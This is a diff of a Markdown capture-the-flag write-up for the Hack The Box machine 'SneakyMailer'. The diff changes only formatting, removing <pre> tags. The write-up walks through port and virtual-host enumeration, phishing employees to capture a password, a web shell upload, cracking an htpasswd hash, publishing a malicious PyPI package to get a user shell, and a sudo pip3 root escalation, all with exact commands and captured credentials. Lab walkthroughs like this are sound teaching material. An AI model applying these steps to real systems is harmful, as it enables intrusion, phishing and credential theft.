@@ -6,7 +6,7 @@ Status: published
 
 # Enumeration
 The box has some mail services running:
-<pre>
+
     Nmap 7.80 scan initiated Mon Nov 23 11:30:14 2020 as: nmap -sS -p- -v -oA enum/nmap-ss-all 10.10.10.197
     Nmap scan report for sneakymailer.htb (10.10.10.197)
     Host is up (0.053s latency).
@@ -21,10 +21,9 @@ The box has some mail services running:
     8080/tcp open  http-proxy
     Read data files from: /usr/bin/../share/nmap
     Nmap done at Mon Nov 23 11:31:30 2020 -- 1 IP address (1 host up) scanned in 75.89 seconds
-</pre>
 
 More detailed scripted scan:
-<pre>
+
     Nmap 7.80 scan initiated Mon Nov 23 11:32:09 2020 as: nmap -sC -sV -A -T4 -p21,22,25,80,143,993,8080 -oA enum/nmap-sCVAT4-open 10.10.10.197
     Nmap scan report for sneakymailer.htb (10.10.10.197)
     Host is up (0.052s latency).
@@ -69,13 +68,12 @@ More detailed scripted scan:
     2   51.25 ms sneakymailer.htb (10.10.10.197)
     OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     # Nmap done at Mon Nov 23 11:33:12 2020 -- 1 IP address (1 host up) scanned in 64.47 seconds
-</pre>
 
 Bunch of services were discovered including notorious vsFTPd (unfortunately this
 one is not backdoored), postfix, nginx and courier imapd. No services seems to
 be available via UDP, at least top 1000 scan didn't show anything. Nikto results
 are also useless, nothing new was found. Gobustered domain webroot:
-<pre>
+
     kali@kali:~/src/htb/active/SneakyMailer$ gobuster dir -u http://sneakycorp.htb/ -w /usr/share/dirb/wordlists/big.txt -x php,txt,swp -o enum/gob-sneakycorp-root-big-x.txt
     ===============================================================
     Gobuster v3.0.1
@@ -100,7 +98,7 @@ are also useless, nothing new was found. Gobustered domain webroot:
     ===============================================================
     2020/11/23 11:45:22 Finished
     ===============================================================
-</pre>
+
 Gathered information if of no value at a glance. That's interesting is that
 there's a suggestion that website has some registration form available
 somewhere:
@@ -116,7 +114,7 @@ there for some time trying to discover where one could register a new account.
 Tried usual methods like bustering dirs with different wordlists and finally
 got lucky trying to bruteforce `Host` header value using 
 [ffuf](https://github.com/ffuf/ffuf):
-<pre>
+
 	kali@kali:~/src/htb/active/SneakyMailer$ ~/bintools/ffuf -w ~/src/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://sneakycorp.htb/ -H "Host: FUZZ.sneakycorp.htb" -mc 200        
     <SNIP>
 	________________________________________________                                                                                                                                                   
@@ -132,7 +130,7 @@ got lucky trying to bruteforce `Host` header value using
 	 :: Matcher          : Response status: 200
 	________________________________________________ 
 	dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
-</pre>
+
 There's a `dev.sneakycorp.htb` virtual host with registration form available at
 `http://dev.sneakycorp.htb/pypi/register.php`. There was a place for another
 couple of head-scratching moments. Sometimes looking carefully at the box page
@@ -154,7 +152,7 @@ And just invoked it for all the addresses in the employee list, just like that:
 `while read -r line; do ./send-email.sh $line; done < ../enum/email-names.txt`
 
 After a while webserver showed up some juicy info:
-<pre>
+
 	kali@kali:~/src/htb/active/SneakyMailer$ nc -nlvp 8000
 	Ncat: Version 7.91 ( https://nmap.org/ncat )
 	Ncat: Listening on :::8000
@@ -170,11 +168,11 @@ After a while webserver showed up some juicy info:
 	Content-Length: 185
 	Content-Type: application/x-www-form-urlencoded
     firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
-</pre>
+
 This request looks like being designated to account registration form mentioned
 earlier. Decoded credentials (which are quite secure) allows to read email in
 Paul Byrd's mailbox, here's short info extracted from there:
-<pre>
+
 	a002 fetch 1 body[TEXT]                                                                          
 	* 1 FETCH (BODY[TEXT] {1888}
 	--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
@@ -190,7 +188,7 @@ Paul Byrd's mailbox, here's short info extracted from there:
 	Hello low
 	Your current task is to install, test and then erase every python module you 
     find in our PyPI service, let me know if you have any inconvenience.
-</pre>
+
 It could be retrieved manually from imap service using nc, ncat or openssl and
 imap commands.
 
@@ -206,7 +204,7 @@ webroot of `dev.sneakycorp.htb`. Uploaded a trivial shell there:
 ```
 `www-data` is the initial user for spawned shell, but could be changed to
 `developer` using `su` and FTP password:
-<pre>
+
 	developer@sneakymailer:~$ whoami && id && hostname && ip a
 	developer
 	uid=1001(developer) gid=1001(developer) groups=1001(developer)
@@ -225,14 +223,14 @@ webroot of `dev.sneakycorp.htb`. Uploaded a trivial shell there:
 	       valid_lft 85851sec preferred_lft 13851sec
 	    inet6 fe80::250:56ff:feb9:553/64 scope link 
        valid_lft forever preferred_lft forever
-</pre>
+
 Linpeas.sh highlighted some interesting htpasswd file:
-<pre>
+
 	Reading /var/www/pypi.sneakycorp.htb/.htpasswd
     pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
-</pre>
+
 Was easily cracked with rockyou wordlist:
-<pre>
+
 	kali@kali:~/src/htb/active/SneakyMailer$ hashcat -m 1600 -a 0 --force '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/' /usr/share/wordlists/rockyou.txt 
 	…
 	$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
@@ -253,7 +251,7 @@ Was easily cracked with rockyou wordlist:
 	Candidates.#1....: soul706 -> sotoba6
 	Started: Mon Nov 23 19:20:41 2020
     Stopped: Mon Nov 23 19:26:44 2020
-</pre>
+
 It turned out that there's another virtual host that used as a pypi repository. 
 Excerpt from `/etc/nginx/sites-available/pypi.sneakycorp.htb`:
 ```nginx
@@ -313,7 +311,7 @@ Then bundle it with `python3 setup.py sdist bdist_wheel` and push to remote pypi
 using cracked creds when prompted:
 `python3 -m twine upload --repository-url http://pypi.sneakycorp.htb:8080 dist/*`.
 After a while we can connect as low and finally have the user shell:
-<pre>
+
 	low@sneakymailer:~$ whoami && id && hostname && ip a && cat user.txt 
 	low
 	uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
@@ -333,23 +331,22 @@ After a while we can connect as low and finally have the user shell:
 	    inet6 fe80::250:56ff:feb9:553/64 scope link 
 	       valid_lft forever preferred_lft forever
     58b7408afb<SNIP>
-</pre>
 
 # Privilege escalation
 Getting the user is the toughest part of this box. Privilege escalation is
 trivial and gets couple of seconds. `low` can use `sudo`:
-<pre>
+
 	low@sneakymailer:~$ sudo -l
 	sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
 	Matching Defaults entries for low on sneakymailer:
 	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 	User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3
-</pre>
+
 According to GTFOBins [pip](https://gtfobins.github.io/gtfobins/pip/#shell) 
 may be used to spawn the shell. And this method indeed works flawlessly, we just
 experience a little lag because some hostname fails to resolve by the `sudo`:
-<pre>
+
 	low@sneakymailer:/dev/shm$ TF=$(mktemp -d)
 	low@sneakymailer:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 	low@sneakymailer:/dev/shm$ sudo pip3 install $TF
@@ -375,4 +372,3 @@ experience a little lag because some hostname fails to resolve by the `sudo`:
 	    inet6 fe80::250:56ff:feb9:553/64 scope link 
 	       valid_lft forever preferred_lft forever
     3ff740e5d<SNIP>
-</pre>
